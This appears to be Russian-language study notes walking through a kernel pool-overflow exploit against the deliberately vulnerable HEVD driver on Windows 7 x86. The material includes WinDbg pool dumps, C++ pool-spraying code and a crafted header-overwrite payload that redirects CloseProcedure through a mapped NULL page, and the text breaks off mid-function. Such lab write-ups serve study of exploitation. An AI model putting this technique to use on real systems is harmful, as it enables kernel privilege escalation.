Vad 850c40d8 size: 48 previous size: 48 (Allocated) Vad 850c4120 size: 48 previous size: 48 (Allocated) Vad 850c4168 size: 28 previous size: 48 (Allocated) FSro 850c4190 size: b8 previous size: 28 (Allocated) File (Protected) 850c4248 size: 128 previous size: b8 (Allocated) Ntfi 850c4370 size: 98 previous size: 128 (Allocated) MmCa 850c4408 size: 168 previous size: 98 (Allocated) CcSc 850c4570 size: 68 previous size: 168 (Allocated) FMsl 850c45d8 size: c8 previous size: 68 (Allocated) Ntfx 850c46a0 size: b8 previous size: c8 (Allocated) File (Protected) 850c4758 size: 128 previous size: b8 (Allocated) Ntfi 850c4880 size: 98 previous size: 128 (Allocated) MmCa 850c4918 size: 28 previous size: 98 (Free) CcSc 850c4940 size: 140 previous size: 28 (Free ) Io Process: 86db94b8 850c4a80 size: 128 previous size: 140 (Allocated) Ntfi 850c4ba8 size: b8 previous size: 128 (Allocated) File (Protected) 850c4c60 size: c8 previous size: b8 (Allocated) Ntfx 850c4d28 size: 20 previous size: c8 (Free) Io *850c4d48 size: 200 previous size: 20 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 850c4f48 doesn&#39;t look like a valid small pool allocation, checking to see if the entire page is actually part of a large page allocation... 850c4f48 is not a valid large pool allocation, checking large session pool... 850c4f48 is not valid pool. Checking for freed (or corrupt) pool Bad previous allocation size @850c4f48, last size was 40 kd&gt; dd 850c4f48-8 ReadVirtual: 850c4f40 not properly sign extended 850c4f40 41414141 41414141 41414141 41414141 850c4f50 00000400 000000f8 00000000 00000000 850c4f60 00000000 00000000 00000001 00000000 850c4f70 00000000 400c001c 82746b40 00000000 A fatal system error has occurred. Интересная вещь, которую нужно отметить - это как мы на самом деле можем контроилровать соседний заголовок с помощью нашего переполнения. Это уязвимость, которую мы будем эксплуатировать грумингом(?) предсказуемым образом, избавлясь от рандома в нашем пуле. Для этого упомянутый ранее CreateEvent подходит идеально, так как он имее тразмер 0x40, который идеально подойдёт для размера нашего пула 0x200 Мы будем спреить большое количество объектов событий, хранить хендлы на них в массивах и смотреть, как это влияет на пул HANDLE spray_event1[10000]; HANDLE spray_event2[5000]; for (int i = 0; i &lt; 10000; i++) { spray_event1[i] = CreateEventA(0, 0, 0, 0); } for (int i = 0; i &lt; 5000; i++) { spray_event2[i] = CreateEventA(0, 0, 0, 0); } kd&gt; !pool 0x850B4620 Pool page 850b4620 region is Unknown 850b4000 size: 40 previous size: 0 (Allocated) Even (Protected) 850b4040 size: 5d8 previous size: 40 (Free) pter *850b4618 size: 200 previous size: 5d8 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) ReadVirtual: 850b4914 not properly sign extended 850b4818 size: 100 previous size: 200 (Allocated) Io Process: 86db7030 850b4918 size: a8 previous size: 100 (Allocated) MmWe ReadVirtual: 850b4afc not properly sign extended 850b49c0 size: 140 previous size: a8 (Allocated) Io Process: 86db7030 ReadVirtual: 850b4bfc not properly sign extended 850b4b00 size: 100 previous size: 140 (Free ) Io Process: 86db7030 850b4c00 size: 40 previous size: 100 (Allocated) Even (Protected) 850b4c40 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4c80 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4cc0 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4d00 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4d40 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4d80 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4dc0 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4e00 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4e40 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4e80 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4ec0 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4f00 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4f40 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4f80 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4fc0 size: 40 previous size: 40 (Allocated) Even (Protected) Наши объекты событий заспреены в невыгружаемом пуле. Теперь нам нужно создать дыры и реаллокейтнуть наш уязвимый буфер Hack в созданные дыры. После реаллоцирования нашего уязвимого буфера нам нужно покорраптить хедер соседнего пула так, чтобы он вел к нашему шеллкоду. Размер объекта события будет 0x40 (0x38 + 0x8), включая заголовок пула kd&gt; !pool 0x850B4620 Pool page 850b4620 region is Unknown 850b4000 size: 40 previous size: 0 (Allocated) Even (Protected) 850b4040 size: 28 previous size: 40 (Free) pter 850b4068 size: 388 previous size: 28 (Free ) XSav 850b43f0 size: 40 previous size: 388 (Free ) Ussb Process: 86db7030 850b4430 size: 140 previous size: 40 (Allocated) Io Process: 86db7030 850b4570 size: a8 previous size: 140 (Free ) MmWe *850b4618 size: 200 previous size: a8 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 850b4818 size: 60 previous size: 200 (Free) Io 850b4878 size: 388 previous size: 60 (Free ) XSav 850b4c00 size: 40 previous size: 388 (Allocated) Even (Protected) 850b4c40 size: 40 previous size: 40 (Allocated) Even (Protected) kd&gt; dt _POOL_HEADER 850b4618 nt!_POOL_HEADER +0x000 PreviousSize : 0y000010101 (0x15) +0x000 PoolIndex : 0y0000000 (0) +0x002 BlockSize : 0y001000000 (0x40) +0x002 PoolType : 0y0000010 (0x2) +0x000 Ulong1 : 0x4400015 +0x004 PoolTag : 0x6b636148 +0x004 AllocatorBackTraceIndex : 0x6148 +0x006 PoolTagHash : 0x6b63 Разберём хедеры: kd&gt; g [+] Allocating Pool chunk [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: NonPagedPool [+] Pool Size: 0x1F8 [+] Pool Chunk: 0x8524D4C8 [+] UserBuffer: 0x00098908 [+] UserBuffer Size: 0x1F8 [+] KernelBuffer: 0x8524D4C8 [+] KernelBuffer Size: 0x1F8 [+] Triggering Pool Overflow Break instruction exception - code 80000003 (first chance) HEVD!TriggerPoolOverflow+0xd8: a855a202 ff750c push dword ptr [ebp+0Ch] kd&gt; !pool 0x8524D4C8 Pool page 8524d4c8 region is Unknown 8524d000 size: 40 previous size: 0 (Allocated) Even (Protected) 8524d040 size: f8 previous size: 40 (Free) r... 8524d138 size: 388 previous size: f8 (Free ) XSav *8524d4c0 size: 200 previous size: 388 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) ReadVirtual: 8524d7fc not properly sign extended 8524d6c0 size: 140 previous size: 200 (Allocated) Io Process: 86d7e228 8524d800 size: 40 previous size: 140 (Allocated) Even (Protected) 8524d840 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d880 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d8c0 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d900 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d940 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d980 size: 40 previous size: 40 (Allocated) Even (Protected) kd&gt; dd 8524d6c0-8 ReadVirtual: 8524d6b8 not properly sign extended 8524d6b8 41414141 41414141 14280040 20206f49 8524d6c8 00320033 0063005c 00720065 00700074 8524d6d8 006f0072 002e0070 006c0064 0000006c 8524d6e8 c0100002 0424007e 95d23b8f 00000000 8524d6f8 1c210007 20206f49 00000000 00630069 8524d708 005c0065 00610048 00640072 00690064 8524d718 006b0073 006f0056 0075006c 0065006d 8524d728 005c0031 00690057 0064006e 0077006f Так как мы спреим невыгружаемый пул с помощью объектов событий, мы можем просто добавить наши значения в конец нашего уязвимого буфера. Но это не сработает, так как хедеры имеют внутреннюю структуру, нужна некоторая модификация. Давайте копнём глубже в хедеры, чтобы понять, что модифицировать: Вещь, которая нас интересует, это TypeIndex, который на самом деле оффсет (0xC) в массиве указателей, который объявляет OBJECT_TYPE каждого объекта, который поддерживает Windows. kd&gt; dd nt!ObTypeIndexTable 8277aee0 00000000 bad0b0b0 84ec7860 84ec7798 8277aef0 84ec76d0 84ec74a0 84ec7360 84ec7298 8277af00 84ec71d0 84ecef78 84eceeb0 84ece818 84ec71d0 - оффсет 0xC 8277af10 84f60418 84f60350 84f61418 84f61350 8277af20 84f5f3f0 84f5f328 84f629b8 84f628f0 8277af30 84f62828 84f62760 84f62698 84f625d0 8277af40 84f62508 84f62440 84f62378 84f63040 8277af50 84f63f78 84f63bd8 84f63b10 84f63a48 kd&gt; dt nt!_OBJECT_TYPE 84f60418 . +0x000 TypeList : [ 0x84f60418 - 0x84f60418 ] +0x000 Flink : 0x84f60418 _LIST_ENTRY [ 0x84f60418 - 0x84f60418 ] +0x004 Blink : 0x84f60418 _LIST_ENTRY [ 0x84f60418 - 0x84f60418 ] +0x008 Name : &quot;Event&quot; +0x000 Length : 0xa +0x002 MaximumLength : 0xc +0x004 Buffer : 0x8cc08a88 &quot;Event&quot; +0x010 DefaultObject : +0x014 Index : 0xc &#39;&#39; +0x018 TotalNumberOfObjects : 0x4643 +0x01c TotalNumberOfHandles : 0x466f +0x020 HighWaterNumberOfObjects : 0x4643 +0x024 HighWaterNumberOfHandles : 0x466f +0x028 TypeInfo : +0x000 Length : 0x50 +0x002 ObjectTypeFlags : 0 &#39;&#39; +0x002 CaseInsensitive : 0y0 +0x002 UnnamedObjectsOnly : 0y0 +0x002 UseDefaultObject : 0y0 +0x002 SecurityRequired : 0y0 +0x002 MaintainHandleCount : 0y0 +0x002 MaintainTypeList : 0y0 +0x002 SupportsObjectCallbacks : 0y0 +0x002 CacheAligned : 0y0 +0x004 ObjectTypeCode : 2 +0x008 InvalidAttributes : 0x100 +0x00c GenericMapping : _GENERIC_MAPPING +0x01c ValidAccessMask : 0x1f0003 +0x020 RetainAccess : 0 +0x024 PoolType : 0 ( NonPagedPool ) +0x028 DefaultPagedPoolCharge : 0 +0x02c DefaultNonPagedPoolCharge : 0x40 +0x030 DumpProcedure : (null) +0x034 OpenProcedure : (null) +0x038 CloseProcedure : (null) Важные моменты: Первый указатель 00000000 очень важен, так как мы на Windows 7 (объяснение дальше) Следующий выделенный указатель 84f60418, который по оффсету 0xC от начала Анализируя, мы понимаем, что это объект типа Event Теперь самое интеерсное: член TypeInfo по оффсету 0x28 В конце этого члена есть вызовы нескольких процедур, можем использовать удобную из предоставленных. Будем импользовать CloseProcedure, находящуюся по 0x38 Оффсет на CloseProcedure становится 0x28 + 0x38 = 0x60 0x60 - это указатель, который мы будем переписывать указателем на шеллкод и затем вызывать метод CloseProcedure Наша цель - изменить оффсет TypeIndex с 0xc на 0x0, поскольку первый указатель является нулевым, а в Windows 7 существует недостаток, при котором возможно отображение NULL-страниц с помощью вызова NtAllocateVirtualMemory NTSTATUS ZwAllocateVirtualMemory( _In_ HANDLE ProcessHandle, _Inout_ PVOID *BaseAddress, _In_ ULONG_PTR ZeroBits, _Inout_ PSIZE_T RegionSize, _In_ ULONG AllocationType, _In_ ULONG Protect ); И затем пишем указатель на наш шеллкод в нужную локацию (0x60), используя вызов WriteProcessMemory BOOL WINAPI WriteProcessMemory( _In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, _In_ LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_ SIZE_T *lpNumberOfBytesWritten ); Ещё одно объяснение из следующей статьи (дальше делал по коду из второго мануала, TODO: переделать, убрать векторы) Общая идея атаки Что у нас есть сейчас? - возможность перезаписать память пула. Чтобы получить из этого выгоду, нам нужно найти способ поменять состояние пула на предсказуемое нами. Если мы повредим поля, мы улетим в БСОД. В целом, невыгружаемый пул фрагментирован, что значит, что в нём есть дыры из чанков, которые были освобождены другими процессами системы. Нам нужно заполнить эти дыры спрея кучу объектов в невыгружаемый пул так, что механизм аллокации положит наши чанки в эти пустые слоты. Как только это получится, нам нужно ещё заспреить объектов, чтобы самые частые(?) объекты в пуле были нашими. Приводя аналогию, В качестве аналогии, если бы у нас был мешок с фигурами из шахматного набора, у нас было бы мало шансов вытащить из него короля; однако, если мы добавим в мешок 15 000 королей, наши шансы значительно возрастут! И так, две цели: заспреить пул объектами, пока органически существующие в пуле дыри не заполнятся нашими объектами заспреить пул снова, чтобы увеличить количество объектов, которые мы аллоцировали, чтобы они были последовательными в невыгружаемом пуле Далее взять наши аллокации, которые образовали большой цельный блок, и проделаем в них дырки размеров с наш ядерный буфер, который мы можем аллоцировать с помощью функций драйвера. Наш ядерный буфер размером 0x200. Таким образом, когда наш буфер аллоцирован, аллокатор положит его по освобождённой 0x200 дыре, которую мы только что создали. Теперь наша аллокация(буфер) полностью окружена объектами, которые мы сами заспреили. Это прекрасно, потому что теперь, когда наш буфер переполняет соседней аллокации пула, мы будем знать, что конкретно мы перезаписываем, потому что это будет чанк, который мы сами и аллоцировали Мы будем использовать эту возможность перезаписи данных, чтобы предсказуемо перезаписать часть данных в одном из наших аллоцированных объектов, который, после освобождения, закончится тем, что ядро выполнит указатель функции, который мы заполним шеллкодом. Теперь план такой: спреим пул объектами, пока все органические дырки не будут заполнены нашими объектами спреим пул снова… делаем 0x200 дыры в аллокациях используем функции драйвера, чтобы заполнить нашим ядерным буфером новые дыры чтобы это распределение предсказуемо перезаписало информацию в соседней аллокации, что приведет к выполнению ядром нашего шеллкода, когда поврежденная аллокация будет освобождена Event objects Автор блога информирует нас, что Event Object идеальны для этой задачи, потому что их размер 0x40. Мы можем освободить 8 Event Objects и получить наши дырки размером 0x200 байт. &gt;&gt;&gt; 0x200 % 0x40 0 &gt;&gt;&gt; 0x200 / 0x40 8.0 На параметры нам всё равно, так что будем вызывать CreateEventA с нулями Что мы видим? Что наш чанк hack посередине аллоцированных CreateEvent’ом: kd&gt; !pool 0x8513C8C8 Pool page 8513c8c8 region is Unknown 8513c000 size: 388 previous size: 0 (Free ) XSav 8513c388 size: 438 previous size: 388 (Free) .... 8513c7c0 size: 40 previous size: 438 (Allocated) Even (Protected) 8513c800 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c840 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c880 size: 40 previous size: 40 (Allocated) Even (Protected) *8513c8c0 size: 200 previous size: 40 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 8513cac0 size: 40 previous size: 200 (Allocated) Even (Protected) 8513cb00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cbc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ccc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cdc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce40 size: 1c0 previous size: 40 (Free) Even И там у нас: kd&gt; dd 8513c8c0 L30 8513c8c0 04400008 6b636148 41414141 41414141 8513c8d0 41414141 41414141 41414141 41414141 8513c8e0 41414141 41414141 41414141 41414141 8513c8f0 41414141 41414141 41414141 41414141 8513c900 41414141 41414141 41414141 41414141 8513c910 41414141 41414141 41414141 41414141 8513c920 41414141 41414141 41414141 41414141 8513c930 41414141 41414141 41414141 41414141 8513c940 41414141 41414141 41414141 41414141 8513c950 41414141 41414141 41414141 41414141 8513c960 41414141 41414141 41414141 41414141 8513c970 41414141 41414141 41414141 41414141 Кстати, указатель на этот ядерный пул содержится в eax (вместо принта в самом драйвере можно было получить адрес ещё из eax) Этот адрес - на 8 байт дальше самой аллокации, потому что 4-х байтовый лонг и тег кладутся до непосредственного буфера. kd&gt; !pool 8513c8c0 Pool page 8513c8c0 region is Unknown 8513c000 size: 388 previous size: 0 (Free ) XSav 8513c388 size: 438 previous size: 388 (Free) .... 8513c7c0 size: 40 previous size: 438 (Allocated) Even (Protected) 8513c800 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c840 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c880 size: 40 previous size: 40 (Allocated) Even (Protected) *8513c8c0 size: 200 previous size: 40 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 8513cac0 size: 40 previous size: 200 (Allocated) Even (Protected) 8513cb00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cbc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ccc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cdc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce40 size: 1c0 previous size: 40 (Free) Even kd&gt; dt nt!_POOL_HEADER 8513c8c0 +0x000 PreviousSize : 0y000001000 (0x8) +0x000 PoolIndex : 0y0000000 (0) +0x002 BlockSize : 0y001000000 (0x40) +0x002 PoolType : 0y0000010 (0x2) +0x000 Ulong1 : 0x4400008 +0x004 PoolTag : 0x6b636148 +0x004 AllocatorBackTraceIndex : 0x6148 +0x006 PoolTagHash : 0x6b63 kd&gt; db 8513c8c0+4 8513c8c4 48 61 63 6b 41 41 41 41-41 41 41 41 41 41 41 41 HackAAAAAAAAAAAA kd&gt; dt nt!_POOL_HEADER 8513cdc0 +0x000 PreviousSize : 0y000001000 (0x8) +0x000 PoolIndex : 0y0000000 (0) +0x002 BlockSize : 0y000001000 (0x8) +0x002 PoolType : 0y0000010 (0x2) +0x000 Ulong1 : 0x4080008 +0x004 PoolTag : 0xee657645 +0x004 AllocatorBackTraceIndex : 0x7645 +0x006 PoolTagHash : 0xee65 kd&gt; dt nt!_OBJECT_HEADER_QUOTA_INFO 8513cdc0+8 +0x000 PagedPoolCharge : 0 +0x004 NonPagedPoolCharge : 0x40 +0x008 SecurityDescriptorCharge : 0 +0x00c SecurityDescriptorQuotaBlock : (null) kd&gt; dt nt!_OBJECT_HEADER 8513cdc0+8+10 +0x000 PointerCount : 0n1 +0x004 HandleCount : 0n1 +0x004 NextToFree : 0x00000001 Void +0x008 Lock : _EX_PUSH_LOCK +0x00c TypeIndex : 0xc &#39;&#39; +0x00d TraceFlags : 0 &#39;&#39; +0x00e InfoMask : 0x8 &#39;&#39; +0x00f Flags : 0 &#39;&#39; +0x010 ObjectCreateInfo : 0x86e7f640 _OBJECT_CREATE_INFORMATION +0x010 QuotaBlockCharged : 0x86e7f640 Void +0x014 SecurityDescriptor : (null) +0x018 Body : _QUAD kd&gt; dd nt!ObTypeIndexTable 82761ee0 00000000 bad0b0b0 84ec7860 84ec7798 82761ef0 84ec76d0 84ec74a0 84ec7360 84ec7298 82761f00 84ec71d0 84ecef78 84eceeb0 84ece818 82761f10 84f60418 84f60350 84f61418 84f61350 82761f20 84f5f3f0 84f5f328 84f629b8 84f628f0 82761f30 84f62828 84f62760 84f62698 84f625d0 82761f40 84f62508 84f62440 84f62378 84f63040 82761f50 84f63f78 84f63bd8 84f63b10 84f63a48 kd&gt; dd nt!ObTypeIndexTable+0xC*4 L1 82761f10 84f60418 kd&gt; dt nt!_OBJECT_TYPE 84f60418 -b +0x000 TypeList : _LIST_ENTRY [ 0x84f60418 - 0x84f60418 ] +0x000 Flink : 0x84f60418 +0x004 Blink : 0x84f60418 +0x008 Name : _UNICODE_STRING &quot;Event&quot; +0x000 Length : 0xa +0x002 MaximumLength : 0xc +0x004 Buffer : 0x8cc08a88 &quot;Event&quot; +0x010 DefaultObject : (null) +0x014 Index : 0xc &#39;&#39; +0x018 TotalNumberOfObjects : 0x5043 +0x01c TotalNumberOfHandles : 0x506e +0x020 HighWaterNumberOfObjects : 0x5e7b +0x024 HighWaterNumberOfHandles : 0x5ea6 +0x028 TypeInfo : _OBJECT_TYPE_INITIALIZER +0x000 Length : 0x50 +0x002 ObjectTypeFlags : 0 &#39;&#39; +0x002 CaseInsensitive : 0y0 +0x002 UnnamedObjectsOnly : 0y0 +0x002 UseDefaultObject : 0y0 +0x002 SecurityRequired : 0y0 +0x002 MaintainHandleCount : 0y0 +0x002 MaintainTypeList : 0y0 +0x002 SupportsObjectCallbacks : 0y0 +0x002 CacheAligned : 0y0 +0x004 ObjectTypeCode : 2 +0x008 InvalidAttributes : 0x100 +0x00c GenericMapping : _GENERIC_MAPPING +0x000 GenericRead : 0x20001 +0x004 GenericWrite : 0x20002 +0x008 GenericExecute : 0x120000 +0x00c GenericAll : 0x1f0003 +0x01c ValidAccessMask : 0x1f0003 +0x020 RetainAccess : 0 +0x024 PoolType : 0 ( NonPagedPool ) +0x028 DefaultPagedPoolCharge : 0 +0x02c DefaultNonPagedPoolCharge : 0x40 +0x030 DumpProcedure : (null) +0x034 OpenProcedure : (null) +0x038 CloseProcedure : (null) +0x03c DeleteProcedure : (null) +0x040 ParseProcedure : (null) +0x044 SecurityProcedure : 0x8288532c +0x048 QueryNameProcedure : (null) +0x04c OkayToCloseProcedure : (null) +0x078 TypeLock : _EX_PUSH_LOCK +0x000 Locked : 0y0 +0x000 Waiting : 0y0 +0x000 Waking : 0y0 +0x000 MultipleShared : 0y0 +0x000 Shared : 0y0000000000000000000000000000 (0) +0x000 Value : 0 +0x000 Ptr : (null) +0x07c Key : 0x6e657645 +0x080 CallbackList : _LIST_ENTRY [ 0x84f60498 - 0x84f60498 ] +0x000 Flink : 0x84f60498 +0x004 Blink : 0x84f60498 По оффсет 0x28 находится структура TypeInfo. Один из её членов ClosePorcedure по оффсету 0x38. Начиная с оффсета 0x0, на который ссылается указатель OBJECT_TYPE, который мы нашли в таблице, CloseProcedure находится по 0x28 + 0x38 = 0x60. ЭТО указатель на функцию, которая будет вызвана при вызове CloseHandle, чтобы освободить Event Objects из невыгружаемого пула памяти. Это наша цель Когда мы особождаем чанк с помощью CloseHandle, ядро идёт по адресу, на который ссылается значение массива по индексу 0xC и ищет по оффсету 0x60 указатель на функцию, вызывая её. kd&gt; dd nt!ObTypeIndexTable 82761ee0 00000000 bad0b0b0 84ec7860 84ec7798 Первый указатель - это 0x0 и мы из ещё не сделанный урок знаем, что мы можем мапить NULL страницу в Windows 7 x86. Итак, благодаря вышеупомянутым блогерам, наш дальнейший путь ясен. Мы корраптим только значение 0xC внутри OBJECT_HEADER, чтобы вместо него было установлено 0x0. Все остальное мы оставим как есть с помощью перезаписи. Таким образом, когда мы освободим этот кусок, ядро начнет искать смещение 0x60 для указателя функции с 0x000000. Поэтому мы просто отобразим страницу NULL и поместим указатель на наш шеллкод по смещению 0x60. Выполняем план Делаем дыры в блоке, чтобы наш буфер расположился там между Event Objects. Мы знаем, что для 0x200 дырки наш нужно освободить 8 объектов, следуя @FuzzySec будем освобождать 8 хендлов Event Objects каждые 0x16 хендлов в нашем векторе. #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;Windows.h&gt; using namespace std; #define DEVICE_NAME &quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot; #define IOCTL 0x22200F vector&lt;HANDLE&gt; defragment_handles; vector&lt;HANDLE&gt; sequential_handles; int main() { HANDLE hFile = CreateFileA(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { cout &lt;&lt; &quot;[!] No handle to HackSysExtremeVulnerableDriver\\n&quot;; exit(1); } cout &lt;&lt; &quot;[&gt;] Grabbed handle to HackSysExtremeVulnerableDriver: &quot; &lt;&lt; hex &lt;&lt; hFile &lt;&lt; &quot;\\n&quot;; cout &lt;&lt; &quot;[&gt;] Spraying pool to defragment...\\n&quot;; for (int i = 0; i &lt; 10000; i++) { HANDLE result = CreateEvent(NULL, 0, 0, L&quot;&quot;); if (!result) { cout &lt;&lt; &quot;[!] Error allocating Event Object during defragmentation\\n&quot;; exit(1); } defragment_handles.push_back(result); } cout &lt;&lt; &quot;[&gt;] Defragmentation spray complete.\\n&quot;; cout &lt;&lt; &quot;[&gt;] Spraying sequential allocations...\\n&quot;; for (int i = 0; i &lt; 10000; i++) { HANDLE result = CreateEvent(NULL, 0, 0, L&quot;&quot;); if (!result) { cout &lt;&lt; &quot;[!] Error allocating Event Object during sequential.\\n&quot;; exit(1); } sequential_handles.push_back(result); } cout &lt;&lt; &quot;[&gt;] Sequential spray complete.\\n&quot;; cout &lt;&lt; &quot;[&gt;] Poking 0x200 byte-sized holes in our sequential allocation...\\n&quot;; for (int i = 0; i &lt; sequential_handles.size(); i = i + 0x16) { for (int x = 0; x &lt; 8; x++) { BOOL freed = CloseHandle(sequential_handles[i + x]); if (freed == false) { cout &lt;&lt; &quot;[!] Unable to free sequential allocation!\\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\\n&quot;; } } } cout &lt;&lt; &quot;[&gt;] Holes poked lol.\\n&quot;; ULONG payload_len = 0x1F8; LPVOID input_buff = VirtualAlloc(NULL, payload_len + 0x1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); memset(input_buff, &#39;\\x41&#39;, payload_len); cout &lt;&lt; &quot;[&gt;] Sending buffer size of: &quot; &lt;&lt; dec &lt;&lt; payload_len &lt;&lt; &quot;\\n&quot;; DWORD bytes_ret = 0; int result = DeviceIoControl(hFile, IOCTL, input_buff, payload_len, NULL, 0, &amp;bytes_ret, NULL); if (!result) { cout &lt;&lt; &quot;[!] DeviceIoControl failed!\\n&quot;; } return 0; } Вернёмся к чуть ранее показанному дампу kd&gt; !pool 0x8513C8C8 Pool page 8513c8c8 region is Unknown 8513c000 size: 388 previous size: 0 (Free ) XSav 8513c388 size: 438 previous size: 388 (Free) .... 8513c7c0 size: 40 previous size: 438 (Allocated) Even (Protected) 8513c800 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c840 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c880 size: 40 previous size: 40 (Allocated) Even (Protected) *8513c8c0 size: 200 previous size: 40 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 8513cac0 size: 40 previous size: 200 (Allocated) Even (Protected) 8513cb00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cbc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ccc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cdc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce40 size: 1c0 previous size: 40 (Free) Even Наш аллокцированный чанк лежит ровно между объектами, которые мы сами создали Портим память Теперь, когда мы контролируем пул с достаточно предсказуемой манере, время перезаписать тут индекс и изменить его на 0x0 с 0xC. Всё остальное между нашей 0x200 аллокацией и этим байтом должно остаться таким же, иначе БСОД. Давайте просто воспользуемся командой dd, чтобы сдампить 32 значения DWORD из начала Event Objects сразу после нашего буфера ядра. kd&gt; dd 8513cac0 ReadVirtual: 8513cac0 not properly sign extended 8513cac0 04080040 ee657645 00000000 00000040 8513cad0 00000000 00000000 00000001 00000001 8513cae0 00000000 0008000c 86e7f640 00000000 8513caf0 ff040001 00000000 8513caf8 8513caf8 8513cb00 04080008 ee657645 00000000 00000040 8513cb10 00000000 00000000 00000001 00000001 8513cb20 00000000 0008000c 86e7f640 00000000 8513cb30 ff040001 00000000 8513cb38 8513cb38 Окей, нам нужно сохранить всё, как есть кроме 0xC и перезаписать этот байт нулём. Мы перезаписываем 40 байтов или 0x28, что даёт нам буфер размером 0x220 ULONG payload_len = 0x220; BYTE* input_buff = (BYTE*)VirtualAlloc(NULL, payload_len + 0x1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); BYTE overwrite_payload[] = ( &quot;\\x40\\x00\\x08\\x04&quot; // pool header &quot;\\x45\\x76\\x65\\xee&quot; // pool tag &quot;\\x00\\x00\\x00\\x00&quot; // obj header quota begin &quot;\\x40\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00&quot; // obj header quota end &quot;\\x01\\x00\\x00\\x00&quot; // obj header begin &quot;\\x01\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x08\\x00&quot; // 0xc converted to 0x0 ); memset(input_buff, &#39;\\x42&#39;, 0x1F8); memcpy(input_buff + 0x1F8, overwrite_payload, 0x28) Нам нужно аллоцировать NULL страницу, что взято у tekwizzz123 typedef NTSTATUS(WINAPI *_NtAllocateVirtualMemory)( HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T AllocationSize, ULONG AllocationType, ULONG Protect ); void allocate_shellcode() { 